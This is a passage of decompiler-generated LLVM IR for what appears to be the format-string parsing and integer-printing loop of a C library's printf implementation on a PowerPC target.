  %v0_1000cc70 = load i32, i32* @r5, align 4
  store i32 %v0_1000cc70, i32* %r31.global-to-local, align 4
  %v0_1000cc74 = load i32, i32* @r4, align 4
  store i32 %v0_1000cc74, i32* @r29, align 4
  store i32 268487804, i32* @lr, align 4
  %v1_1000cc78 = bitcast i8** %stack_var_-200 to i32*
  %v2_1000cc78 = call i32 @_ppfs_init(i32* %v1_1000cc78)
  %tmp72 = icmp sgt i32 %v2_1000cc78, -1
  br i1 %tmp72, label %dec_label_pc_1000ccac, label %dec_label_pc_1000cc84

dec_label_pc_1000cc84:                            ; preds = %entry
  %v3_1000cc84 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000cc84 = ptrtoint i8* %v3_1000cc84 to i32
  store i32 %v4_1000cc84, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000cc84, i32* @r3, align 4
  %v0_1000cc90 = call i32 @__GI_strlen()
  %v3_1000cc94 = icmp eq i32 %v0_1000cc90, 0
  br i1 %v3_1000cc94, label %dec_label_pc_1000d2ac, label %dec_label_pc_1000cc9c

dec_label_pc_1000cc9c:                            ; preds = %dec_label_pc_1000cc84
  %v0_1000cc9c = load i32, i32* @r31, align 4
  %v0_1000cca0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000cca8.715 to i32), i32* @lr, align 4
  %v3_1000cca4 = inttoptr i32 %v0_1000cca0 to i16*
  %v4_1000cca4 = call i32 @__stdio_fwrite(i32 %v0_1000cc9c, i32 %v0_1000cc90, i16* %v3_1000cca4)
  br label %dec_label_pc_1000d2ac

dec_label_pc_1000ccac:                            ; preds = %entry
  %v0_1000ccb0 = load i32, i32* @r31, align 4
  store i32 268487864, i32* @lr, align 4
  %v2_1000ccb4 = call i32 @_ppfs_prepargs(i32 %v2_1000cc60, i32 %v0_1000ccb0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000cd4c = zext i8 %tmp59 to i32
  %v2_1000cd50 = icmp sgt i32 %tmp60, 0
  %v2_1000cd54 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000cd78 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000cd7c = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000cdb0 = icmp eq i32 %tmp57, 0
  %v2_1000d10c = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000d02c = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000d030 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000cea4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000cf80 = icmp eq i32 %tmp57, 1
  %v2_1000cf24 = icmp ugt i32 %tmp57, 2
  %v4_1000ce64 = zext i8 %tmp55 to i32
  %v0_1000d298.pre = load i32, i32* @r29, align 4
  %v1_1000cd64 = mul nuw nsw i32 %v4_1000cd4c, 8
  %v2_1000cd68 = add i32 %v2_1000cd54, %v1_1000cd64
  %v1_1000cd6c = add i32 %v2_1000cd68, -8
  %v1_1000cd80 = add i32 %tmp58, 1
  %v2_1000cdd8 = icmp ugt i32 %tmp57, 7
  %v2_1000cfb8 = icmp ugt i32 %tmp57, 15
  %v2_1000cfec = icmp ugt i32 %tmp57, 17
  %v3_1000cfec = icmp eq i32 %tmp57, 17
  %v2_1000d094 = icmp ugt i32 %tmp57, 19
  %v3_1000d094 = icmp eq i32 %tmp57, 19
  %v3_1000d100 = icmp eq i32 %tmp57, 20
  %v1_1000cdf0 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_10019460.717 to i32), i32 -1)
  %v2_1000cdf0 = inttoptr i32 %v1_1000cdf0 to i8*
  %v3_1000cf30 = icmp eq i32 %tmp57, 3
  %v3_1000cf40 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000d298

dec_label_pc_1000ccc4.backedge:                   ; preds = %dec_label_pc_1000cd18, %dec_label_pc_1000ccd0
  %storemerge13.in = phi i32 [ %v1_1000cce0, %dec_label_pc_1000ccd0 ], [ %v1_1000cd18, %dec_label_pc_1000cd18 ]
  %v1_1000ccd816 = phi i32 [ %v0_1000ccf0, %dec_label_pc_1000ccd0 ], [ %v1_1000cd18, %dec_label_pc_1000cd18 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000ccc4

dec_label_pc_1000ccc4:                            ; preds = %dec_label_pc_1000ccc4.backedge, %dec_label_pc_1000d298
  %v0_1000ccf0 = phi i32 [ %v1_1000ccd816, %dec_label_pc_1000ccc4.backedge ], [ %v0_1000d298, %dec_label_pc_1000d298 ]
  %v1_1000cce0 = phi i32 [ %storemerge13, %dec_label_pc_1000ccc4.backedge ], [ %v0_1000d298, %dec_label_pc_1000d298 ]
  %v1_1000ccc4 = inttoptr i32 %v1_1000cce0 to i8*
  %v2_1000ccc4 = load i8, i8* %v1_1000ccc4, align 1
  %v3_1000ccc4 = zext i8 %v2_1000ccc4 to i32
  store i32 %v3_1000ccc4, i32* %r0.global-to-local, align 4
  %v3_1000ccc8 = icmp eq i8 %v2_1000ccc4, 0
  br i1 %v3_1000ccc8, label %dec_label_pc_1000ccd8, label %dec_label_pc_1000ccd0

dec_label_pc_1000ccd0:                            ; preds = %dec_label_pc_1000ccc4
  %v3_1000ccd0 = icmp eq i8 %v2_1000ccc4, 37
  br i1 %v3_1000ccd0, label %dec_label_pc_1000ccd8, label %dec_label_pc_1000ccc4.backedge

dec_label_pc_1000ccd8:                            ; preds = %dec_label_pc_1000ccd0, %dec_label_pc_1000ccc4
  %v4_1000ccd8 = icmp eq i32 %v1_1000cce0, %v0_1000ccf0
  br i1 %v4_1000ccd8, label %dec_label_pc_1000cd0c, label %dec_label_pc_1000cce0

dec_label_pc_1000cce0:                            ; preds = %dec_label_pc_1000ccd8
  %v2_1000cce0 = sub i32 %v1_1000cce0, %v0_1000ccf0
  store i32 %v2_1000cce0, i32* @r31, align 4
  %v4_1000cce0 = icmp sgt i32 %v2_1000cce0, 0
  br i1 %v4_1000cce0, label %dec_label_pc_1000ccf0, label %dec_label_pc_1000cd00

dec_label_pc_1000ccf0:                            ; preds = %dec_label_pc_1000cce0
  %v0_1000ccf8 = load i32, i32* %r24.global-to-local, align 4
  store i32 268487936, i32* @lr, align 4
  %v3_1000ccfc = inttoptr i32 %v0_1000ccf8 to i16*
  %v4_1000ccfc = call i32 @__stdio_fwrite(i32 %v0_1000ccf0, i32 %v2_1000cce0, i16* %v3_1000ccfc)
  %v1_1000cd00.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cd00

dec_label_pc_1000cd00:                            ; preds = %dec_label_pc_1000cce0, %dec_label_pc_1000ccf0
  %v1_1000cd08 = phi i32 [ %v1_1000cd00.pre, %dec_label_pc_1000ccf0 ], [ %v2_1000cce0, %dec_label_pc_1000cce0 ]
  %storemerge2 = phi i32 [ %v4_1000ccfc, %dec_label_pc_1000ccf0 ], [ 0, %dec_label_pc_1000cce0 ]
  %v4_1000cd00 = icmp eq i32 %storemerge2, %v1_1000cd08
  br i1 %v4_1000cd00, label %dec_label_pc_1000cd08, label %dec_label_pc_1000d2a8

dec_label_pc_1000cd08:                            ; preds = %dec_label_pc_1000cd00
  %v0_1000cd08 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000cd08 = add i32 %v0_1000cd08, %v1_1000cd08
  store i32 %v2_1000cd08, i32* %r23.global-to-local, align 4
  %v0_1000cd0c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000cd0c

dec_label_pc_1000cd0c:                            ; preds = %dec_label_pc_1000ccd8, %dec_label_pc_1000cd08
  %v0_1000cd18 = phi i32 [ %v0_1000ccf0, %dec_label_pc_1000ccd8 ], [ %v0_1000cd0c.pre, %dec_label_pc_1000cd08 ]
  %v1_1000cd0c = inttoptr i32 %v0_1000cd18 to i8*
  %v2_1000cd0c = load i8, i8* %v1_1000cd0c, align 1
  %v3_1000cd0c = zext i8 %v2_1000cd0c to i32
  store i32 %v3_1000cd0c, i32* %r0.global-to-local, align 4
  %v3_1000cd10 = icmp eq i8 %v2_1000cd0c, 0
  br i1 %v3_1000cd10, label %dec_label_pc_1000d2ac, label %dec_label_pc_1000cd18

dec_label_pc_1000cd18:                            ; preds = %dec_label_pc_1000cd0c
  %v1_1000cd18 = add i32 %v0_1000cd18, 1
  %v2_1000cd18 = inttoptr i32 %v1_1000cd18 to i8*
  %v3_1000cd18 = load i8, i8* %v2_1000cd18, align 1
  %v4_1000cd18 = zext i8 %v3_1000cd18 to i32
  store i32 %v4_1000cd18, i32* %r0.global-to-local, align 4
  %v3_1000cd20 = icmp eq i8 %v3_1000cd18, 37
  br i1 %v3_1000cd20, label %dec_label_pc_1000ccc4.backedge, label %dec_label_pc_1000cd28

dec_label_pc_1000cd28:                            ; preds = %dec_label_pc_1000cd18
  store i32 %v2_1000cc60, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000cd18, i8** %stack_var_-200, align 4
  store i32 268488000, i32* @lr, align 4
  %v3_1000cd3c = call i32 @_ppfs_parsespec(i32* %v1_1000cc78, i32 %v1_1000cd18)
  store i32 %v2_1000cc60, i32* @r3, align 4
  store i32 268488008, i32* @lr, align 4
  %v0_1000cd44 = call i32 @_ppfs_setargs()
  store i32 %v4_1000cd4c, i32* @r7, align 4
  store i32 %v2_1000cd54, i32* %r0.global-to-local, align 4
  br i1 %v2_1000cd50, label %dec_label_pc_1000cd64, label %dec_label_pc_1000cd70

dec_label_pc_1000cd64:                            ; preds = %dec_label_pc_1000cd28
  br label %dec_label_pc_1000cd70

dec_label_pc_1000cd70:                            ; preds = %dec_label_pc_1000cd28, %dec_label_pc_1000cd64
  %v0_1000cd9c82 = phi i32 [ %v1_1000cd6c, %dec_label_pc_1000cd64 ], [ %v2_1000cd54, %dec_label_pc_1000cd28 ]
  store i32 %v0_1000cd9c82, i32* %r10.global-to-local, align 4
  store i32 %v2_1000cd78, i32* @r8, align 4
  store i32 %v1_1000cd80, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000cda0.preheader, label %dec_label_pc_1000cda0.preheader.thread

dec_label_pc_1000cda0.preheader.thread:           ; preds = %dec_label_pc_1000cd70
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000cdac

dec_label_pc_1000cda0.preheader:                  ; preds = %dec_label_pc_1000cd70
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000cd7c, label %dec_label_pc_1000cdac, label %dec_label_pc_1000cd98.preheader

dec_label_pc_1000cd98.preheader:                  ; preds = %dec_label_pc_1000cda0.preheader
  store i32 %v0_1000cd9c82, i32* %stack_var_-344, align 4
  %v1_1000cd9c83 = add i32 %v0_1000cd9c82, 8
  store i32 %v1_1000cd9c83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000cda888 = add i32 %tmp58, -1
  store i32 %v1_1000cda888, i32* %ctr.global-to-local, align 4
  %v2_1000cda889 = icmp eq i32 %v1_1000cda888, 0
  br i1 %v2_1000cda889, label %dec_label_pc_1000cdac, label %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge

dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge: ; preds = %dec_label_pc_1000cd98.preheader, %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge.dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge_crit_edge
  %v1_1000cd98.pre = phi i32 [ %v1_1000cd98.pre.pre, %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge.dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge_crit_edge ], [ %v2_1000cd78, %dec_label_pc_1000cd98.preheader ]
  %v1_1000cda091 = phi i32 [ %v1_1000cda0, %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge.dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000cd98.preheader ]
  %v1_1000cd9c90 = phi i32 [ %v1_1000cd9c, %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge.dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge_crit_edge ], [ %v1_1000cd9c83, %dec_label_pc_1000cd98.preheader ]
  %v3_1000cd98 = add i32 %v1_1000cd98.pre, %v1_1000cda091
  %v4_1000cd98 = inttoptr i32 %v3_1000cd98 to i32*
  store i32 %v1_1000cd9c90, i32* %v4_1000cd98, align 4
  %v0_1000cd9c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cd9c = add i32 %v0_1000cd9c, 8
  store i32 %v1_1000cd9c, i32* %r10.global-to-local, align 4
  %v0_1000cda0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cda0 = mul i32 %v0_1000cda0, 4
  store i32 %v1_1000cda0, i32* %r0.global-to-local, align 4
  %v1_1000cda4 = add i32 %v0_1000cda0, 1
  store i32 %v1_1000cda4, i32* %r11.global-to-local, align 4
  %v0_1000cda8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cda8 = add i32 %v0_1000cda8, -1
  store i32 %v1_1000cda8, i32* %ctr.global-to-local, align 4
  %v2_1000cda8 = icmp eq i32 %v1_1000cda8, 0
  br i1 %v2_1000cda8, label %dec_label_pc_1000cdac, label %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge.dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge_crit_edge

dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge.dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge_crit_edge: ; preds = %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge
  %v1_1000cd98.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge

dec_label_pc_1000cdac:                            ; preds = %dec_label_pc_1000cd98.preheader, %dec_label_pc_1000cd98.dec_label_pc_1000cd98_crit_edge, %dec_label_pc_1000cda0.preheader.thread, %dec_label_pc_1000cda0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000cdb0, label %dec_label_pc_1000cdb8, label %dec_label_pc_1000cdd8

dec_label_pc_1000cdb8:                            ; preds = %dec_label_pc_1000cdac
  %v0_1000cdbc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000cdbc, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000cdbc, 0
  %v1_1000cdc4 = zext i1 %tmp96 to i32
  %v2_1000cdc4 = ashr i32 %v0_1000cdbc, 31
  %v3_1000cdc4 = and i32 %v2_1000cdc4, -2
  %v4_1000cdc4 = or i32 %v3_1000cdc4, %v1_1000cdc4
  store i32 %v4_1000cdc4, i32* @r5, align 4
  %v1_1000cdcc = call i32 @__asm_rlwinm(i32 %v0_1000ceec, i32 0, i32 20, i32 23)
  store i32 %v1_1000cdcc, i32* @r4, align 4
  %v1_1000cdd0 = inttoptr i32 %v1_1000cdcc to i16*
  %v2_1000cdd0 = call i32 @_store_inttype(i16* %v1_1000cdd0)
  br label %dec_label_pc_1000d294

dec_label_pc_1000cdd8:                            ; preds = %dec_label_pc_1000cdac
  br i1 %v2_1000cdd8, label %dec_label_pc_1000cfb8, label %dec_label_pc_1000cde0

dec_label_pc_1000cde0:                            ; preds = %dec_label_pc_1000cdd8
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000cdf0 = load i8, i8* %v2_1000cdf0, align 1
  %v4_1000cdf0 = zext i8 %v3_1000cdf0 to i32
  store i32 %v4_1000cdf0, i32* %r30.global-to-local, align 4
  %v3_1000cdf4 = icmp eq i8 %v3_1000cdf0, 10
  br i1 %v3_1000cdf4, label %dec_label_pc_1000cdfc, label %dec_label_pc_1000ce24

dec_label_pc_1000cdfc:                            ; preds = %dec_label_pc_1000cde0
  store i32 %v0_1000ceec, i32* %r0.global-to-local, align 4
  %v1_1000ce00 = call i32 @__asm_rlwinm(i32 %v0_1000ceec, i32 26, i32 31, i32 31)
  %v1_1000ce04 = call i32 @__asm_rlwinm(i32 %v0_1000ceec, i32 27, i32 31, i32 31)
  %v3_1000ce08 = icmp eq i32 %v1_1000ce00, 0
  %v2_1000ce0c = icmp ne i32 %v1_1000ce04, 0
  %not.v2_1000ce0c = xor i1 %v2_1000ce0c, true
  %v6_1000ce10 = sext i1 %not.v2_1000ce0c to i32
  store i32 %v6_1000ce10, i32* %r0.global-to-local, align 4
  %v1_1000ce18 = select i1 %v2_1000ce0c, i32 44, i32 87
  store i32 %v1_1000ce18, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ce08, label %dec_label_pc_1000ce24, label %dec_label_pc_1000ce20

dec_label_pc_1000ce20:                            ; preds = %dec_label_pc_1000cdfc
  %v1_1000ce20 = or i32 %v1_1000ce18, 128
  store i32 %v1_1000ce20, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ce24

dec_label_pc_1000ce24:                            ; preds = %dec_label_pc_1000cde0, %dec_label_pc_1000cdfc, %dec_label_pc_1000ce20
  %v0_1000ce24 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ce24 = icmp ugt i32 %v0_1000ce24, 5
  br i1 %v2_1000ce24, label %dec_label_pc_1000ce4c, label %dec_label_pc_1000ce2c

dec_label_pc_1000ce2c:                            ; preds = %dec_label_pc_1000ce24
  %v3_1000ce2c = icmp eq i32 %v0_1000ce24, 3
  br i1 %v3_1000ce2c, label %dec_label_pc_1000ce34, label %dec_label_pc_1000ce3c

dec_label_pc_1000ce34:                            ; preds = %dec_label_pc_1000ce2c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000ce50

dec_label_pc_1000ce3c:                            ; preds = %dec_label_pc_1000ce2c
  %v3_1000ce3c = icmp eq i32 %v0_1000ce24, 1
  br i1 %v3_1000ce3c, label %dec_label_pc_1000ce54, label %dec_label_pc_1000ce50

dec_label_pc_1000ce4c:                            ; preds = %dec_label_pc_1000ce24
  %v0_1000ce4c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000ce4c = sub i32 0, %v0_1000ce4c
  store i32 %v1_1000ce4c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ce50

dec_label_pc_1000ce50:                            ; preds = %dec_label_pc_1000ce3c, %dec_label_pc_1000ce34, %dec_label_pc_1000ce4c
  br label %dec_label_pc_1000ce54

dec_label_pc_1000ce54:                            ; preds = %dec_label_pc_1000ce3c, %dec_label_pc_1000ce50
  %storemerge3 = phi i32 [ 11, %dec_label_pc_1000ce50 ], [ 6, %dec_label_pc_1000ce3c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_1000ce54 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000ce54, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_1000ce54, -1
  br i1 %tmp75, label %dec_label_pc_1000ce68, label %dec_label_pc_1000ce64

dec_label_pc_1000ce64:                            ; preds = %dec_label_pc_1000ce54
  br label %dec_label_pc_1000ce68

dec_label_pc_1000ce68:                            ; preds = %dec_label_pc_1000ce54, %dec_label_pc_1000ce64
  %storemerge = phi i32 [ %v4_1000ce64, %dec_label_pc_1000ce64 ], [ 32, %dec_label_pc_1000ce54 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_1000ce68 = icmp eq i32 %v0_1000ce24, 1
  br i1 %v3_1000ce68, label %dec_label_pc_1000ce84, label %dec_label_pc_1000ce74

dec_label_pc_1000ce74:                            ; preds = %dec_label_pc_1000ce68
  %v0_1000ce74 = load i32, i32* @r7, align 4
  %v1_1000ce74 = mul i32 %v0_1000ce74, 4
  store i32 %v1_1000ce74, i32* %r0.global-to-local, align 4
  %v0_1000ce78 = load i32, i32* @r1, align 4
  %v2_1000ce78 = add i32 %v0_1000ce78, %v1_1000ce74
  %v1_1000ce7c = add i32 %v2_1000ce78, 188
  %v2_1000ce7c = inttoptr i32 %v1_1000ce7c to i32*
  %v3_1000ce7c = load i32, i32* %v2_1000ce7c, align 4
  store i32 %v3_1000ce7c, i32* %r0.global-to-local, align 4
  %v1_1000ce80 = call i32 @__asm_rlwinm(i32 %v3_1000ce7c, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1000ce84

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000ce68, %dec_label_pc_1000ce74
  %v3_1000ce84 = load i32, i32* %stack_var_-344, align 4
  %v0_1000ce88 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000ce88, i32* @r5, align 4
  %v2_1000ce8c = inttoptr i32 %v0_1000ce88 to i32*
  %v3_1000ce8c = call i32 @_load_inttype(i32 %v3_1000ce84, i32* %v2_1000ce8c)
  %v0_1000ce9c = load i32, i32* %r31.global-to-local, align 4
  %v6_1000cea4 = call i32 @_uintmaxtostr(i8* %v5_1000cea4, i32 %v3_1000ce8c, i32 %v3_1000ce84, i32 %v0_1000ce88, i32 %v0_1000ce9c)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1000cea4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000cef8, label %dec_label_pc_1000ceb8

dec_label_pc_1000ceb8:                            ; preds = %dec_label_pc_1000ce84
  %v7_1000cea4 = inttoptr i32 %v6_1000cea4 to i8*
  %v3_1000ceb8 = load i8, i8* %v7_1000cea4, align 1
  %v4_1000ceb8 = zext i8 %v3_1000ceb8 to i32
  store i32 %v4_1000ceb8, i32* %r0.global-to-local, align 4
  %v3_1000cec0 = icmp eq i8 %v3_1000ceb8, 45
  br i1 %v3_1000cec0, label %dec_label_pc_1000cec8, label %dec_label_pc_1000cedc

dec_label_pc_1000cec8:                            ; preds = %dec_label_pc_1000ceb8
  %v1_1000cec8 = or i32 %v0_1000ceec, 2
  store i32 %v1_1000cec8, i32* %r0.global-to-local, align 4
  %v2_1000cecc = add i32 %v6_1000cea4, 1
  store i32 %v2_1000cecc, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000cef8

dec_label_pc_1000cedc:                            ; preds = %dec_label_pc_1000ceb8
  %v1_1000cedc = and i32 %v0_1000ceec, 2
  store i32 %v1_1000cedc, i32* %r0.global-to-local, align 4
  %v3_1000cedc = icmp eq i32 %v1_1000cedc, 0
  br i1 %v3_1000cedc, label %dec_label_pc_1000ceec, label %dec_label_pc_1000cee4

dec_label_pc_1000cee4:                            ; preds = %dec_label_pc_1000cedc
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000cef8

dec_label_pc_1000ceec:                            ; preds = %dec_label_pc_1000cedc
  %v1_1000ceec = urem i32 %v0_1000ceec, 2
  store i32 %v1_1000ceec, i32* %r11.global-to-local, align 4
  %v3_1000ceec = icmp eq i32 %v1_1000ceec, 0
  br i1 %v3_1000ceec, label %dec_label_pc_1000cef8, label %dec_label_pc_1000cef4

dec_label_pc_1000cef4:                            ; preds = %dec_label_pc_1000ceec
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000cef8

dec_label_pc_1000cef8:                            ; preds = %dec_label_pc_1000ceec, %dec_label_pc_1000ce84, %dec_label_pc_1000cee4, %dec_label_pc_1000cec8, %dec_label_pc_1000cef4
  %v0_1000cf64 = phi i32 [ %v6_1000cea4, %dec_label_pc_1000ce84 ], [ %v2_1000cecc, %dec_label_pc_1000cec8 ], [ %v6_1000cea4, %dec_label_pc_1000ceec ], [ %v6_1000cea4, %dec_label_pc_1000cef4 ], [ %v6_1000cea4, %dec_label_pc_1000cee4 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000ceec, %dec_label_pc_1000ce84 ], [ %v1_1000cec8, %dec_label_pc_1000cec8 ], [ %v0_1000ceec, %dec_label_pc_1000ceec ], [ %v0_1000ceec, %dec_label_pc_1000cef4 ], [ %v0_1000ceec, %dec_label_pc_1000cee4 ]
  %v3_1000cef8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000d10c, i32* %r0.global-to-local, align 4
  %v2_1000cf00 = sub i32 %v2_1000d10c, %v0_1000cf64
  %v1_1000cf08 = add i32 %v2_1000cf00, 127
  store i32 %v1_1000cf08, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000cef8, -1
  br i1 %tmp76, label %dec_label_pc_1000cf14, label %dec_label_pc_1000cf10

dec_label_pc_1000cf10:                            ; preds = %dec_label_pc_1000cef8
  br label %dec_label_pc_1000cf14

dec_label_pc_1000cf14:                            ; preds = %dec_label_pc_1000cef8, %dec_label_pc_1000cf10
  %v0_1000cf48 = phi i32 [ %v3_1000cef8, %dec_label_pc_1000cef8 ], [ 1, %dec_label_pc_1000cf10 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000cf18 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000cf18, i32* %r11.global-to-local, align 4
  %v3_1000cf18 = icmp eq i32 %v1_1000cf18, 0
  br i1 %v3_1000cf18, label %dec_label_pc_1000cf64, label %dec_label_pc_1000cf20

dec_label_pc_1000cf20:                            ; preds = %dec_label_pc_1000cf14
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000cf24, label %dec_label_pc_1000cf30, label %dec_label_pc_1000cf40.thread

dec_label_pc_1000cf40.thread:                     ; preds = %dec_label_pc_1000cf20
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000cf64

dec_label_pc_1000cf30:                            ; preds = %dec_label_pc_1000cf20
  br i1 %v3_1000cf30, label %dec_label_pc_1000cf38, label %dec_label_pc_1000cf40

dec_label_pc_1000cf38:                            ; preds = %dec_label_pc_1000cf30
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000cf64

dec_label_pc_1000cf40:                            ; preds = %dec_label_pc_1000cf30
  br i1 %v3_1000cf40, label %dec_label_pc_1000cf48, label %dec_label_pc_1000cf64

dec_label_pc_1000cf48:                            ; preds = %dec_label_pc_1000cf40
  %v3_1000cf48 = icmp ugt i32 %v0_1000cf48, %v1_1000cf08
  br i1 %v3_1000cf48, label %dec_label_pc_1000cf64, label %dec_label_pc_1000cf50

dec_label_pc_1000cf50:                            ; preds = %dec_label_pc_1000cf48
  %v1_1000cf50 = inttoptr i32 %v0_1000cf64 to i8*
  %v2_1000cf50 = load i8, i8* %v1_1000cf50, align 1
  %v3_1000cf50 = zext i8 %v2_1000cf50 to i32
  store i32 %v3_1000cf50, i32* %r0.global-to-local, align 4
  %v3_1000cf58 = icmp eq i8 %v2_1000cf50, 48
  br i1 %v3_1000cf58, label %dec_label_pc_1000cf64, label %dec_label_pc_1000cf60

dec_label_pc_1000cf60:                            ; preds = %dec_label_pc_1000cf50
  %v1_1000cf60 = add i32 %v2_1000cf00, 128
  br label %dec_label_pc_1000cf64

dec_label_pc_1000cf64:                            ; preds = %dec_label_pc_1000cf40.thread, %dec_label_pc_1000cf40, %dec_label_pc_1000cf50, %dec_label_pc_1000cf48, %dec_label_pc_1000cf14, %dec_label_pc_1000cf38, %dec_label_pc_1000cf60
  %v1_1000cfac = phi i32 [ %v0_1000cf48, %dec_label_pc_1000cf40 ], [ 1, %dec_label_pc_1000cf50 ], [ %v0_1000cf48, %dec_label_pc_1000cf48 ], [ %v0_1000cf48, %dec_label_pc_1000cf14 ], [ %v0_1000cf48, %dec_label_pc_1000cf38 ], [ %v1_1000cf60, %dec_label_pc_1000cf60 ], [ %v0_1000cf48, %dec_label_pc_1000cf40.thread ]
  %v1_1000cf64 = inttoptr i32 %v0_1000cf64 to i8*
  %v2_1000cf64 = load i8, i8* %v1_1000cf64, align 1
  %v3_1000cf64 = zext i8 %v2_1000cf64 to i32
  store i32 %v3_1000cf64, i32* %r0.global-to-local, align 4
  %v3_1000cf68 = icmp eq i8 %v2_1000cf64, 48
  br i1 %v3_1000cf68, label %dec_label_pc_1000cf70, label %dec_label_pc_1000cfa8

dec_label_pc_1000cf70:                            ; preds = %dec_label_pc_1000cf64
  %v0_1000cf70 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000cf70, 6
  br i1 %tmp77, label %dec_label_pc_1000cf7c, label %dec_label_pc_1000cf78

dec_label_pc_1000cf78:                            ; preds = %dec_label_pc_1000cf70
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000cf7c

dec_label_pc_1000cf7c:                            ; preds = %dec_label_pc_1000cf70, %dec_label_pc_1000cf78
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cf80, label %dec_label_pc_1000cf88, label %dec_label_pc_1000cf98

dec_label_pc_1000cf88:                            ; preds = %dec_label_pc_1000cf7c
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10019444.718 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d124

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf7c
  %v3_1000cf98 = icmp eq i32 %v1_1000cfac, 0
  br i1 %v3_1000cf98, label %dec_label_pc_1000cfa0, label %dec_label_pc_1000cfa8

dec_label_pc_1000cfa0:                            ; preds = %dec_label_pc_1000cf98
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d124

dec_label_pc_1000cfa8:                            ; preds = %dec_label_pc_1000cf98, %dec_label_pc_1000cf64
  %v3_1000cfa8 = icmp ugt i32 %v1_1000cfac, %v1_1000cf08
